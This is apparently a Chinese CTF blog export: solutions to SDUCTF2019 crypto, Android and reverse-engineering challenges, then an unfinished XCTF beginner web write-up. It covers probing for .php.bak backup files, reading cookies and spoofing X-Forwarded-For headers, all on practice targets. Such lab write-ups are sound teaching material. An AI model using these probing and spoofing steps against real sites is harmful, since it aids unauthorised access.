title="0x05 宇宙终极问题"></a>0x05 宇宙终极问题</h3><blockquote><p>题目描述：Do you know The Answer to the Ultimate Question of Life, The Universe, and Everything?</p><p>Give me 3 integers, x, y, and z, such that <strong>x^3 + y^3 + z^3 = 42</strong></p><p>得到x、y、z后请把它们乘起来，然后包裹上flag{}</p></blockquote><p>直接百度得到解如下，扔进python跑一波大数乘法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">-80538738812075974</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = <span class="number">80435758145817515</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>z = <span class="number">12602123297335631</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x**<span class="number">3</span>+y**<span class="number">3</span>+z**<span class="number">3</span></span><br><span class="line"><span class="number">42</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x*y*z</span><br><span class="line"><span class="number">-81639006040518590050493906720365515701570561538910</span></span><br></pre></td></tr></table></figure><h3 id="0x06-秘密报文"><a href="#0x06-秘密报文" class="headerlink" title="0x06 秘密报文"></a>0x06 秘密报文</h3><blockquote><p>题目描述：在第一次世界大战期间，法国陆军捕获到一份秘密报文，交给中尉Georges Painvin尝试破解。</p><p>报文内容如下：<br>XX DF GG AF XD XF AF XD XF AF AG DD AF GF DX XF XD</p><p>解密之后请自行拼接flag{}提交</p></blockquote><p>我记得之前做题时有看见过类似密码，但是忘了是啥。</p><p>最明显的，先把中尉名字<code>Georges Painvin</code>百度一波，得知时<code>ADFGVX密码</code>对照密码表，解得flag：<code>flag{youarearealhacker}</code></p><p><img src="/2019/11/15/SDUCTF2019-wp/crypto6.jpg" alt="图源自百度百科"></p><h3 id="0x07-ok"><a href="#0x07-ok" class="headerlink" title="0x07 ok?"></a>0x07 ok?</h3><blockquote><p>题目描述：</p><p>就问你ok不ok</p><p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook.</p></blockquote><p>既然是密码题，那就百度呗</p><p>搜索的是ok密码，文章和转换的github地址如下</p><blockquote><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a> </p><p><a href="https://github.com/splitbrain/ook" target="_blank" rel="noopener">https://github.com/splitbrain/ook</a> </p></blockquote><p>不过有点不对，观察样例密码，把#换成?，解得flag</p><h3 id="0x08-什么密码？"><a href="#0x08-什么密码？" class="headerlink" title="0x08 什么密码？"></a>0x08 什么密码？</h3><blockquote><p>题目描述：</p><p>EVA给Tom发了一封邮件，但是Tom却看不懂EVA想表达什么，请你向Tom解释一下这封邮件</p><p>发件人：EVA<br>收件人：Tom<br>Pxevhfxmhietrpbmamablztfx</p><p>flag格式：sductf{+.}</p><p>The answer is related to my favorite movie.</p></blockquote><p>密码可能做着做着心态崩了，不小心把Crypto当misc做了</p><p>把图片下下来，没注意到图片上到Cesar，binwalk跑一波图片，发下里面还有一个zlib，百度解zlib，然后疯狂报错，贼难受，然后看了hint，得知凯撒密码</p><p>难受 -600point</p><p>位移几位忘了。</p><p>And 十分真实，都把顺序放我TODO List下了，妈耶</p><p>什么密码？<a href="https://blog.csdn.net/qq_40574571/article/details/80164981" target="_blank" rel="noopener">https://blog.csdn.net/qq_40574571/article/details/80164981</a></p><p><img src="/2019/11/15/SDUCTF2019-wp/crypto8.jpg" alt></p><h3 id="0x09-Mix"><a href="#0x09-Mix" class="headerlink" title="0x09 Mix"></a>0x09 Mix</h3><blockquote><p>题目描述：解开她，flag就是你的了</p><p> JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzM7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzE7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzI7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzM7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzI7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzA7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzQ7 </p></blockquote><p>一看这种就是混合密码，靠直觉先解一波base64，然后发下可以解下去，发一波解密顺序，忘记录flag了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（base64-&gt;unicode-&gt;转中文（utf-8)-&gt;urldecode-&gt;hex decode）</span><br></pre></td></tr></table></figure><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a><center>Mobile</center></h2><h3 id="0x01-apk1"><a href="#0x01-apk1" class="headerlink" title="0x01 apk1"></a>0x01 apk1</h3><blockquote><p> 题目描述：用着安卓手机，你懂apk吗？ </p></blockquote><p>通过工具<code>d2j-dex2jar</code>和<code>jd-gui</code>两者逆向apk得到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/mobile-apk1.jpg" alt></p><h3 id="0x02-apk2"><a href="#0x02-apk2" class="headerlink" title="0x02 apk2"></a>0x02 apk2</h3><blockquote><p>题目描述： 你真的懂apk吗？ </p></blockquote><p>通过工具<code>d2j-dex2jar</code>和<code>jd-gui</code>两者逆向apk得到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/mobile-apk2.jpg" alt></p><p>然后看代码可知是对字符串进行一个排序，将字符串里的第i位放到s2[i]位，得到结果</p><p>直接写一个python脚本得到flag</p><h3 id="0x03-apk3"><a href="#0x03-apk3" class="headerlink" title="0x03 apk3"></a>0x03 apk3</h3><blockquote><p> 题目描述：再来一发，听说过Kotlin吗？ </p></blockquote><p>下下来解压按套路拖给<code>d2j-dex2jar</code>然后发现有两个<code>.dex</code>后缀的文件，逆向报错</p><p>于是现去网上下了一个jeb逆向，然后找一个样例现学jeb</p><p><img src="/2019/11/15/SDUCTF2019-wp/mobile-apk3-2.jpg" alt></p><p>直觉看这个字符串有用，然后在下面果然发现</p><p><img src="/2019/11/15/SDUCTF2019-wp/mobile-apk3-1.jpg" alt></p><p>play函数就是对这个字符串进行比对，就是将字符串的偶数位的ascii值减2，得到新串与该字符串进行比较</p><p>写个python脚本逆着加回去可得flag</p><p>apk3：sductf{Easy_Apk_1s_n0t_hard_4_U!}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;f</span><br><span class="line"><span class="string">'a2P1W3Pmc0Tha3jfOX@rVzDzV22wbF7oWXHkVzPfTSD9'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> cnt%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>            s += chr(ord(i)+<span class="number">2</span>)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>            s+=i</span><br><span class="line"><span class="meta">... </span>    cnt += <span class="number">1</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">'c2R1Y3Rme0Vhc3lfQXBrXzFzX24wdF9oYXJkXzRfVSF9'</span></span><br></pre></td></tr></table></figure><h3 id="0x04-FuckAPP"><a href="#0x04-FuckAPP" class="headerlink" title="0x04 FuckAPP"></a>0x04 FuckAPP</h3><blockquote><p>题目描述：  你真的懂apk吗？ </p></blockquote><p>常规，拖进jeb看main函数，发现只有一些setViewID之类的函数并没有主要的逻辑，于是回去将apk解压缩</p><p>发现包里和以前的apk解压不同，apk3是多了一个Kotlin文件夹，而这个fuck app 是多了一个lib文件夹，猜主要的函数在里面，打开<code>lib/arm64-v8a</code>得到一个<code>libnative-lib.so</code>，拖进IDA里进行逆向</p><p><img src="/2019/11/15/SDUCTF2019-wp/mobile-apk4-fuck.jpg" alt></p><p>暴力搜一波果然看到了flag，直接得到flag，还以为要看函数逻辑。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><center>Reverse</center></h2><h3 id="0x01-Java-jar"><a href="#0x01-Java-jar" class="headerlink" title="0x01 Java jar"></a>0x01 Java jar</h3><blockquote><p>题目描述： 都是java程序员，互相偷个代码谁不会呀！ </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/re1-java.jpg" alt></p><p>下载附件得到jar包，直接解压得到文件，打开<code>main.class</code>，看到flag明文就在main.class里</p><h3 id="0x02-C"><a href="#0x02-C" class="headerlink" title="0x02 C"></a>0x02 C</h3><blockquote><p>题目描述： C#简直跟java一样，会java就自然上手c#了。 </p></blockquote><p>下载附件得到sductf.exe，拖入辣个女人ida进行逆向，直接得到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/re2-sductf.jpg" alt></p><h3 id="0x03-Rust"><a href="#0x03-Rust" class="headerlink" title="0x03 Rust"></a>0x03 Rust</h3><blockquote><p>题目描述： 你听说过Rust语言吗？<br>                    据说它非常安全。 </p></blockquote><p>没接触过rust语言，不过据说逆向不知道程序逆向结构时，最好自己写个程序HelloWorld进行逆向一波看结构，但是我偷懒了。</p><p>直接百度搜索：rust逆向</p><p> <a href="https://www.anquanke.com/post/id/169970" target="_blank" rel="noopener">https://www.anquanke.com/post/id/169970</a> </p><p> <a href="https://blog.csdn.net/qq_33438733/article/details/81138573" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/81138573</a> </p><p>看完链接之后打开ida，还需要64bit的辣个女人。</p><p>乱逛发现有一个字符串，但是解码出来是一个奇怪的东西，继续找主函数main</p><p><img src="/2019/11/15/SDUCTF2019-wp/re3-rust-2.jpg" alt></p><p>主函数入口</p><p><img src="/2019/11/15/SDUCTF2019-wp/re3-rust-3.jpg" alt></p><p>点进第一个函数查看流程</p><p><img src="/2019/11/15/SDUCTF2019-wp/re3-rust-4.jpg" alt></p><p>既然是逆向，那就从尾部往后面看，果然看到一个判断和一个类似flag的字符串<code>c2R1Y3Rme0lfbDB2ZV9ydXN0X2hoaGh9</code>，base64解码得到flag：<code>sductf{I_l0ve_rust_hhhh}</code></p><p><img src="/2019/11/15/SDUCTF2019-wp/re3-rust-5.jpg" alt></p><h3 id="0x04-EasyCrackMe"><a href="#0x04-EasyCrackMe" class="headerlink" title="0x04 EasyCrackMe"></a>0x04 EasyCrackMe</h3><blockquote><p>题目描述：无</p></blockquote><p>下下来是一个exe文件，用010editor打开，发现说是PE文件，而且也发现是PE文件头，于是拖进去IDA逆向。</p><p>逆向main函数无思路，便开TextView查看，看到如下图黄色字符串感觉很奇怪，而且下面有一个Congratulations！，猜测这段字符串是flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/re4-1.jpg" alt></p><p>F5进入查看具体函数，大概是对输入字符串的每一位与0x16进行异或得到v5字符串</p><p><img src="/2019/11/15/SDUCTF2019-wp/re4-2.jpg" alt></p><p>于是用python逆函数一波，果然得到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/re4-3.jpg" alt></p><p>在后面写wp时，完善了思路。</p><p>因为进去运行提示输入一个key，然后就在IDA的TextView搜索key，得到第一张图的函数入口，接下来看逻辑即可。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-adworld-web-wp</title>
      <link href="/2019/11/11/XCTF-adworld-web-wp/"/>
      <url>/2019/11/11/XCTF-adworld-web-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-amp-WriteUp"><a href="#Web-amp-WriteUp" class="headerlink" title="Web&amp;WriteUp"></a><center>Web&amp;WriteUp</center></h1><p>Web如同一座正三角冰山，等着去探索。。。</p><h1 id="攻防世界-amp-Web新手练习区"><a href="#攻防世界-amp-Web新手练习区" class="headerlink" title="攻防世界&amp;Web新手练习区"></a><center>攻防世界&amp;Web新手练习区</center></h1><h2 id="0x01-view-source"><a href="#0x01-view-source" class="headerlink" title="0x01  view_source"></a>0x01  view_source</h2><blockquote><p> 题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。 </p></blockquote><p>利用view-source://url或者f12或者右键查看源码，flag就在源码里</p><h2 id="0x02-get-post"><a href="#0x02-get-post" class="headerlink" title="0x02  get_post"></a>0x02  get_post</h2><blockquote><p> 题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ </p></blockquote><p>利用burp suite 发包得到flag</p><p><img src="/2019/11/11/XCTF-adworld-web-wp/2.jpg" alt></p><p>另一种思路是利用python的requests库发送请求。</p><h2 id="0x03-robots"><a href="#0x03-robots" class="headerlink" title="0x03  robots"></a>0x03  robots</h2><blockquote><p>题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 </p></blockquote><p>查看源码肯定是没有flag的，根据题目robots可联想到web的robots.txt协议</p><p><img src="/2019/11/11/XCTF-adworld-web-wp/3.jpg" alt></p><blockquote><p>robots.txt协议是在Web站点的根目录下设置一个robots.txt文件，规定站点上的哪些区域或者哪些页面是限制搜索的。搜索程序将参考该文件，决定站点中的哪些区域是不允许搜索的，并在接下来的搜索过程中跳过这些区域。</p><p>下面是一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; #robots.txt for http://somehost.com</span><br><span class="line">&gt; </span><br><span class="line">&gt;User-agent: *</span><br><span class="line">&gt; Disallow: /cgi-bin</span><br><span class="line">&gt; Disallow: /registration</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>示例中第一行是一行注释，注释以一个#开头。</p><ul><li>User-agent：指访问站点的程序，每个浏览器都有一个唯一的User-agent值，浏览器在向Web服务器发送请求时会在每个请求中都附加这个值。Web站点通过在robots.txt中使用User-agent就可以针对不同的User-agent设置不同的规则。</li><li>Disallow是拒绝语句，定义了搜索程序不允许访问的Web站点路径。拒绝语句只针对路径进行设置，不针对具体的文件。</li></ul></blockquote><p>直接访问<a href="http://xxx.xxx.xxx.xxx/robots.txt" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/robots.txt</a></p><p><img src="/2019/11/11/XCTF-adworld-web-wp/3_2.jpg" alt></p><p>得到一个php路径，直接访问得到flag</p><p><img src="/2019/11/11/XCTF-adworld-web-wp/3_3.jpg" alt></p><h2 id="0x04-backup"><a href="#0x04-backup" class="headerlink" title="0x04 backup"></a>0x04 backup</h2><blockquote><p> 题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ </p></blockquote><p><img src="/2019/11/11/XCTF-adworld-web-wp/4.jpg" style="zoom:50%;"></p><p> php的备份有两种：<em>.php~和</em>.php.bak </p><p> 如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件 <code>index.php.bak</code></p><p>访问 <a href="http://url/index.php.bak" target="_blank" rel="noopener">http://url/index.php.bak</a> 即自动下载了index.php.bak，打开查看flag就在里面</p><h2 id="0x05-cookie"><a href="#0x05-cookie" class="headerlink" title="0x05  cookie"></a>0x05  cookie</h2><blockquote><p>题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’ </p></blockquote><p>chrome在console中输入命令<code>javascript:alert(document.cookie)</code></p><p>其实在地址栏输入也可以实现</p><p>弹出 <code>look-here=cookie.php</code></p><p>访问<code>url/cookie.php</code>看到<code>See the http response</code></p><p>打开F12开发者模式的Network，查看<code>cookie.php</code>的回应，Response里没找到flag，最后在Response Headers里找到flag</p><h2 id="0x06-disabled-button"><a href="#0x06-disabled-button" class="headerlink" title="0x06 disabled button"></a>0x06 disabled button</h2><blockquote><p> 题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ </p></blockquote><p>明显是一个灰色的按钮，查看源码有<code>&lt;button disabled&gt;</code>跟hackergame2019的签到题一样，把disabled删掉点击按钮即可。</p><h2 id="0x07-simple-js"><a href="#0x07-simple-js" class="headerlink" title="0x07  simple_js"></a>0x07  simple_js</h2><blockquote><p> 题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) </p></blockquote><p>先输入任意字符进入页面查看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dechiffre</span>(<span class="params">pass_enc</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> pass = <span class="string">"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65"</span>;</span><br><span class="line">        <span class="keyword">var</span> tab  = pass_enc.split(<span class="string">','</span>);</span><br><span class="line">                <span class="keyword">var</span> tab2 = pass.split(<span class="string">','</span>);<span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">""</span>;i = <span class="number">0</span>;j = tab.length;</span><br><span class="line">                        k = j + (l) + (n=<span class="number">0</span>);</span><br><span class="line">                        n = tab2.length;</span><br><span class="line">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += <span class="built_in">String</span>.fromCharCode((o = tab2[i]));</span><br><span class="line">                                <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span><br><span class="line">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span><br><span class="line">                        o = tab[i-l];</span><br><span class="line">                                <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k<span class="number">-1</span>)</span><br><span class="line">                                        p += <span class="built_in">String</span>.fromCharCode((o = tab2[i]));</span><br><span class="line">                        &#125;</span><br><span class="line">        p += <span class="built_in">String</span>.fromCharCode(tab2[<span class="number">17</span>]);</span><br><span class="line">        pass = p;<span class="keyword">return</span> pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">String</span>[<span class="string">"fromCharCode"</span>](dechiffre(<span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span>));</span><br><span class="line"></span><br><span class="line">    h = <span class="built_in">window</span>.prompt(<span class="string">'Enter password'</span>);</span><br><span class="line">    alert( dechiffre(h) );</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>看源码得知不论输入什么都会跳转至假密码然后失败，于是直接处理<code>fromCharCode</code>，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s)</span><br><span class="line"><span class="string">"55,56,54,79,115,69,114,116,107,49,50"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">""</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"><span class="meta">... </span>   b =chr(i)</span><br><span class="line"><span class="meta">... </span>    s += b</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s)</span><br><span class="line"><span class="number">786</span>OsErtk12</span><br></pre></td></tr></table></figure><h2 id="0x08-xff-referer"><a href="#0x08-xff-referer" class="headerlink" title="0x08 xff referer"></a>0x08 xff referer</h2><blockquote><p>题目描述：X老师告诉小宁其实xff和referer是可以伪造的 </p></blockquote><p>直接访问网站，提示需要特定ip访问</p><p><img src="/2019/11/11/XCTF-adworld-web-wp/8.jpg" style="zoom: 80%;"></p><p>由题目描述猜想是改http请求，进行下一步.</p><p>百度xff可知</p><blockquote><p>X-Forwarded-For位于HTTP协议的请求头， 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入RFC 7239（Forwarded HTTP Extension）标准之中。</p></blockquote><p>利用burpsuite直接伪造http header 的 <code>X-Forwarded-For</code>， X-Forwarded-For 请求头格式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: client, proxy1, proxy2</span><br></pre></td></tr></table></figure><p> 可以看到，XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP </p><p>如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息<code>X-Forwarded-For: IP0, IP1, IP2</code></p><blockquote><p>PS： Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求 </p></blockquote><p>然后得到如下页面</p><p><img 